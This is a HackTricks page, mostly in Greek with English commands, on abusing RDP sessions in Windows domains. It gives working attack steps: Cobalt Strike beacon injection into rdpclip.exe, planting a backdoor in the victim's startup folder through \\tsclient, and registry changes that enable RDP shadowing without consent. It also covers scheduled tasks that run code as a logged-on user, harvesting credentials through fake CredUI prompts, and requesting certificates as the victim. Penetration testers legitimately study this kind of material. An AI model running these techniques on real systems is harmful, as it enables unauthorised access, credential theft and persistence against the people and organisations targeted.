# Κατάχρηση Συνεδριών RDP

{{#include ../../banners/hacktricks-training.md}}

## RDP Process Injection

Εάν η **εξωτερική ομάδα** έχει **RDP access** σε οποιονδήποτε **υπολογιστή** στο τρέχον domain, ένας **επιτιθέμενος** θα μπορούσε να **παραβιάσει αυτόν τον υπολογιστή και να περιμένει τον χρήστη**.

Μόλις ο χρήστης συνδεθεί μέσω RDP, ο **επιτιθέμενος μπορεί να μεταβεί στη συνεδρία του χρήστη** και να καταχραστεί τα δικαιώματά του στο εξωτερικό domain.
```bash
# Supposing the group "External Users" has RDP access in the current domain
## lets find where they could access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```
Δείτε **other ways to steal sessions with other tools** [**in this page.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## RDPInception

Αν ένας χρήστης εισέλθει μέσω **RDP into a machine** όπου ένας **attacker** είναι **waiting** για αυτόν, ο attacker θα μπορεί να **inject a beacon in the RDP session of the user** και εάν ο **victim mounted his drive** όταν συνδέεται μέσω RDP, ο **attacker could access it**.

Σε αυτή την περίπτωση μπορείτε απλά να **compromise** τον **victims** **original computer** γράφοντας ένα **backdoor** στον **statup folder**.
```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

Size     Type    Last Modified         Name
----     ----    -------------         ----
dir     02/10/2021 04:11:30   $Recycle.Bin
dir     02/10/2021 03:23:44   Boot
dir     02/20/2021 10:15:23   Config.Msi
dir     10/18/2016 01:59:39   Documents and Settings
[...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```
## Shadow RDP

Εάν είστε **local admin** σε έναν υπολογιστή όπου το θύμα έχει ήδη μια **active RDP session**, μπορεί να μπορέσετε να **προβάλετε/ελέγξετε αυτήν την επιφάνεια εργασίας χωρίς να κλέψετε τον κωδικό ή να κάνετε dumping το LSASS**.

Αυτό εξαρτάται από την πολιτική **Remote Desktop Services shadowing** που αποθηκεύεται σε:
```text
HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
```
Ενδιαφέρουσες τιμές:

- `0`: Απενεργοποιημένο
- `1`: `EnableInputNotify` (έλεγχος, απαιτείται έγκριση χρήστη)
- `2`: `EnableInputNoNotify` (έλεγχος, **χωρίς έγκριση χρήστη**)
- `3`: `EnableNoInputNotify` (προβολή μόνο, απαιτείται έγκριση χρήστη)
- `4`: `EnableNoInputNoNotify` (προβολή μόνο, **χωρίς έγκριση χρήστη**)
```cmd
:: Check the policy
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow

:: Enable interaction without consent
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f

:: Enumerate sessions and shadow the target one
quser /server:<HOST>
mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
```
Αυτό είναι ιδιαίτερα χρήσιμο όταν ένας χρήστης με προνόμια που είναι συνδεδεμένος μέσω RDP άφησε ξεκλείδωτο desktop, συνεδρία KeePass, MMC console, browser session ή admin shell ανοιχτό.

## Scheduled Tasks As Logged-On User

Αν είστε **local admin** και ο χρήστης-στόχος είναι **currently logged on**, το Task Scheduler μπορεί να ξεκινήσει κώδικα **ως αυτός ο χρήστης χωρίς τον κωδικό του**.

Αυτό μετατρέπει την υπάρχουσα logon session του θύματος σε ένα execution primitive:
```cmd
schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
schtasks /run /S <HOST> /TN "Updater"
```
Σημειώσεις:

- If the user is **not logged on**, Windows usually requires the password to create a task that runs as them.
- If the user **is logged on**, the task can reuse the existing logon context.
- This is a practical way to execute GUI actions or launch binaries inside the victim session without touching LSASS.

## Κακόβουλη χρήση του CredUI Prompt από τη σύνδεση του θύματος

Μόλις μπορείτε να εκτελέσετε **inside the victim's interactive desktop** (for example via **Shadow RDP** or **a scheduled task running as that user**), μπορείτε να εμφανίσετε μια **real Windows credential prompt** χρησιμοποιώντας CredUI APIs και να συλλέξετε τα credentials που εισάγει το θύμα.

Relevant APIs:

- `CredUIPromptForWindowsCredentials`
- `CredUnPackAuthenticationBuffer`

Τυπική ροή:

1. Spawn a binary in the victim session.
2. Display a domain-authentication prompt that matches the current domain branding.
3. Unpack the returned auth buffer.
4. Validate the provided credentials and optionally keep prompting until valid credentials are entered.

Αυτό είναι χρήσιμο για **on-host phishing** επειδή η προτροπή αποδίδεται από τις standard Windows APIs αντί για μια ψεύτικη HTML φόρμα.

## Requesting a PFX In the Victim Context

The same **scheduled-task-as-user** primitive can be used to request a **certificate/PFX as the logged-on victim**. That certificate can later be used for **AD authentication** as that user, avoiding password theft entirely.

High-level flow:

1. Gain **local admin** on a host where the victim is logged on.
2. Run enrollment/export logic as the victim using a **scheduled task**.
3. Export the resulting **PFX**.
4. Use the PFX for PKINIT / certificate-based AD authentication.

See the AD CS pages for follow-up abuse:

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

## Αναφορές

- [SensePost - From flat networks to locked up domains with tiering models](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
- [Microsoft - Remote Desktop shadow](https://learn.microsoft.com/windows/win32/termserv/remote-desktop-shadow)
- [NetExec - Shadow RDP plugin PR #465](https://github.com/Pennyw0rth/NetExec/pull/465)
- [NetExec - schtask_as module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
- [NetExec - Request PFX via scheduled task PR #908](https://github.com/Pennyw0rth/NetExec/pull/908)

{{#include ../../banners/hacktricks-training.md}}
